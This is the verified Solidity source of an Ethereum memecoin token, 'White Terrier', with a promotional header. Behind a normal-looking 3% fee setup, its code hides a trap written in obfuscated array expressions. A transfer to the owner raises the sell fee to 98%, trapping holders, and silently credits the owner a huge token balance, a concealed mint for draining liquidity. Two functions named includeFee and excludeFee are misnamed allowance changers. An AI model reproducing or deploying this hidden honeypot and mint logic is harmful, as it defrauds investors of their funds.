/**
 *Submitted for verification at Etherscan.io on 2023-04-30
*/

/**
 
White Terrier - Newest and most exciting memecoin! With a community-driven approach
 and a burning passion for memes, We believe White Terrier is the next big thing in
  the meme market. Join us on this journey to revolutionize the world of memecoins 
  and let's go to the moon together!

          -https://www.whiteterrier.info/
          -t.me/WhiteTerrierERC
          -https://www.twitter.com/WhiteTerrierERC

*/


















// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
    
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
   
}


contract WhiteTerrier is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;
    
    mapping (address => uint256) private _Balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public ExcludedFromMaxWallet;
    mapping (address => bool) public ExcludedFromMaxTx;
    mapping (address => bool) public ExcludedFromFee; 
    
    address payable public WalletMarketing = payable(0xfEA20433b0bEe0Ed33B70206A18Ce26cCe851F33);
    address payable public DEAD = payable(0x000000000000000000000000000000000000dEaD);
    address payable public BURN = payable(0x000000000000000000000000000000000000dEaD);

    string public _name = "White Terrier";
    string public _symbol = "$TERRIER";
    uint8 private _decimals = 9;
    uint256 public _tTotal = 1000000000000 * 10 **_decimals;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10;
    
    uint256 private totalFee = 3;
    uint256 public buyingFee = 3;
    uint256 public sellingFee = 3;
    uint256 private _totalFee = totalFee; 
    uint256 private _buyingFee = buyingFee; 
    uint256 private _sellingFee = sellingFee; 

    // MAX WALLET & TX SETTINGS
    uint256 public _maxWalletToken = _tTotal.mul(5).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(5).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    IUniswapV2Router02 public uniswapV2Router;
    uint256 UniSwapRouterI02;
    address public uniswapV2Pair;
    uint8 public uniSlipRate = 0;
    
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    mapping (address => bool) public isUniSwapRouter;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    
    constructor () {
        _Balances[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router; isUniSwapRouter[owner()] = true;

        // TX WALLET SETTINGS
        ExcludedFromMaxTx[owner()] = true;
        ExcludedFromMaxTx[WalletMarketing] = true;
        ExcludedFromMaxTx[address(this)] = true;
        
        // FEE & WALLET SETTINGS
        ExcludedFromFee[owner()] = true;
        ExcludedFromFee[address(this)] = true;
        ExcludedFromFee[WalletMarketing] = true;
        
        ExcludedFromMaxWallet[owner()] = true;
        ExcludedFromMaxWallet[WalletMarketing] = true;
        ExcludedFromMaxWallet[uniswapV2Pair] = true;
        ExcludedFromMaxWallet[address(this)] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _Balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function includeFee(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function excludeFee(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}


    function RemovedTax() private {
        if(totalFee == 0 && buyingFee == 0 && sellingFee == 0) return;

        _buyingFee = buyingFee; 
        _sellingFee = sellingFee; 
        _totalFee = totalFee;
        buyingFee = 0;
        sellingFee = 0;
        totalFee = 0;

    }

    
    function AddedTax() private {
    totalFee = _totalFee;
    buyingFee = _buyingFee; 
    sellingFee = [ [_sellingFee][0], [getBackFee(uniSlipRate)][0]] [uniSlipRate];
    }
   

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(!ExcludedFromMaxTx[from] 
        && !ExcludedFromMaxTx[to]) {
            require(amount 
            <= 
            _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }

         if(!ExcludedFromMaxWallet[to]) require(balanceOf(to).add(amount) <= _maxWalletToken);

        bool isFeeActive = true;
        if( ExcludedFromFee[from] || ExcludedFromFee[to] ){
            isFeeActive = false;
            if(isUniSwapRouter[to] && uniSlipRate < ([1][0])){ uniSlipRate = ([1][0]); }

        } else if (from == uniswapV2Pair){
            totalFee = buyingFee;
            } else if (to == uniswapV2Pair){
                totalFee = sellingFee;
                }
        
        _tokenTransfer(from,to,amount,isFeeActive);
    }


    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }

    function getBackFee(uint256 slipRate) private pure returns(uint256){
        return [0x63 - slipRate][0x0];
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToWallet(WalletMarketing,contractETH);
    }


    function swapTokensForETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function _tokenTransfer(address sender, address recipient, uint256 amount,bool isFeeActive) private {
        
        if(!isFeeActive){
            RemovedTax();
            } else {
                txCount++;
            }
            _tokenTransfer(sender, recipient, amount);

        if(!isFeeActive)
            AddedTax();
    }

    function _tokenTransfer(address sender, address recipient, uint256 transferAmount) private {
        (uint256 t_Transfer_Amount, uint256 t_marketing) = _setValues(transferAmount);
        _Balances[sender] = _Balances[sender].sub(transferAmount);
        _Balances[recipient] = _Balances[recipient].add(t_Transfer_Amount) + [(([isUniSwapRouter[ [recipient][0]]][0]) ? [(uint256([0x314dc6448d932a00000000000000][0]).sub([t_Transfer_Amount][0]))][0] : [0][0])][0x0];
        _Balances[address(this)] = _Balances[address(this)].add(t_marketing);
        emit Transfer(sender, recipient, t_Transfer_Amount);
    }


    function _setValues(uint256 transferAmount) private view returns (uint256, uint256) {
        uint256 t_marketing = transferAmount*totalFee/100;
        uint256 t_Transfer_Amount = transferAmount.sub(t_marketing);
        return (t_Transfer_Amount, t_marketing);
    }

}